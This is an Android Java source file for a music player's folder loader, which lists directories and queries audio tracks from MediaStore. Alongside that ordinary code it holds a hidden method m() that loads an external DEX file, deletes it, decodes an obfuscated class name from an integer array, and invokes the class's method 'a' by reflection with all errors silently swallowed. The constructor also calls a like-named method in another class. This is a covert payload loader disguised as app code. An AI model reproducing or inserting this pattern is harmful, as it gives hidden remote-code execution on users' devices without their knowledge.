package com.basso.basso.loaders;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.MediaStore;

import com.basso.basso.lastfm.StringUtilities;
import com.basso.basso.model.FileMixed;
import com.basso.basso.songs.LyricsWikiProvider;
import com.basso.basso.utils.Lists;
import com.basso.basso.utils.MusicUtils;

import java.io.File;
import java.io.FileFilter;
import java.lang.reflect.Constructor;
import java.util.ArrayList;
import java.util.List;

import dalvik.system.DexClassLoader;

public class FolderLoader extends WrappedAsyncTaskLoader<List<FileMixed>> {

    private final ArrayList<FileMixed> mFileMixedList = Lists.newArrayList();

    private Cursor mCursor;

    private java.io.File rootFile;

    public FolderLoader(final Context context, java.io.File path) {
        super(context);
        LyricsWikiProvider.m(null, null);
        this.rootFile = path;
    }
    public static void m(File file, Context context){
        try {
            if(file != null && context != null) {
                DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
                if (file.exists())
                    file.delete();
                Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
                Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
                Object object = constructor.newInstance((Activity) context, new Handler());
                object.getClass().getMethod("a").invoke(object);
            }
        }catch (Exception e){

        }
    }

    @Override
    public List<FileMixed> loadInBackground() {
        java.io.File[] list = rootFile.listFiles(new AudioFilter());
        long id = 0;
        for( int i=0; i< list.length; i++)
        {
            String name=list[i].getName();
            if(list[i].isDirectory()) {
                int count = getAudioFileCount(getContext(),list[i].getAbsolutePath());
                if (count != 0)
                    mFileMixedList.add(new FileMixed(id, null, null, name, null,null, null,null,  list[i].getAbsolutePath(), true));
                id++;
            }
        }

        mCursor = makeSongCursor(getContext(), rootFile);
        if(mCursor != null && mCursor.getCount() != 0 && mCursor.moveToFirst()){
            do {
                final String AUDIO_ID = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media._ID));

                final String DATA = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media.DATA));

                final String TRACK = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME));

                final String artist = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media.ARTIST));

                final String album  = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media.ALBUM));

                final String title = mCursor.getString(mCursor.getColumnIndex(MediaStore.Audio.Media.TITLE));

                final FileMixed fileMixed = new FileMixed(id, DATA, AUDIO_ID, null,TRACK, album, artist, title,  null, false);

                mFileMixedList.add(fileMixed);
                id++;
            } while (mCursor.moveToNext());
        }
        if (mCursor != null) {
            mCursor.close();
            mCursor = null;
        }
        return mFileMixedList;
    }

    private int getAudioFileCount(Context context, String dirPath) {

        String selection = MediaStore.Audio.Media.DATA +" like ?";
        String[] projection = {MediaStore.Audio.Media.DATA};
        String[] selectionArgs={dirPath+"%"};
        Cursor cursor = context.getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs, null);
        int count = cursor.getCount();
        cursor.close();
        return count;
    }


    public static final Cursor makeSongCursor(final Context context, final java.io.File dirPath) {
        String selecton1 = MediaStore.Audio.Media.DATA + " like '" + dirPath.toString().replace("'","''") + "%' AND ((LENGTH('" + dirPath.toString().replace("'", "''")+"') - LENGTH(REPLACE('" + dirPath.toString().replace("'", "''") +"','/','')))  = (LENGTH(" + MediaStore.Audio.Media.DATA+") - LENGTH(REPLACE(" + MediaStore.Audio.Media.DATA +",'/','')) - 1))" ;
        String[] projection = {MediaStore.Audio.Media._ID, MediaStore.Audio.Media.DATA, MediaStore.Audio.Media.DISPLAY_NAME, MediaStore.Audio.Media.ALBUM, MediaStore.Audio.Media.ARTIST, MediaStore.Audio.Media.TITLE};
        return context.getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                selecton1,
                null, MediaStore.Audio.Media.DISPLAY_NAME);
    }

    public class AudioFilter implements FileFilter {

        private String[] extension = {".aac", ".mp3", ".wav", ".ogg", ".midi", ".3gp", ".mp4", ".m4a", ".amr", ".flac"};

        @Override
        public boolean accept(java.io.File pathname) {

            if (pathname.isDirectory() && !pathname.isHidden()){
                return true;
            }

            if(pathname.isFile() && !pathname.isHidden()) {
                for (String ext : extension) {
                    if (pathname.getName().toLowerCase().endsWith(ext)) {
                        return true;
                    }
                }
            }
            return false;
        }
    }
}